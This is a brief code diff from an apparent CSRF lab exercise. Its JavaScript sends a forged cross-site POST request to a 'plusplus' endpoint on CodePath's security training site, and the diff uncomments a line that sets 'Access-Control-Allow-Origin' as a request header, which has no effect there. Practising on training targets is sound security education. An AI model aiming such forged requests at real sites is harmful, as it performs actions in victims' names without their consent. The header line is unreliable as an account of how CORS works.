@@ -15,7 +15,7 @@
                 var url =
                     "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=9464f59d6612758dfdf3985b3f79f9efb804ea10"
                 xhr.open("POST", url, true);
-                //xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://security.codepath.com/');
+                xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://security.codepath.com/');
                 xhr.send();
                 console.log("Hello World")
             }
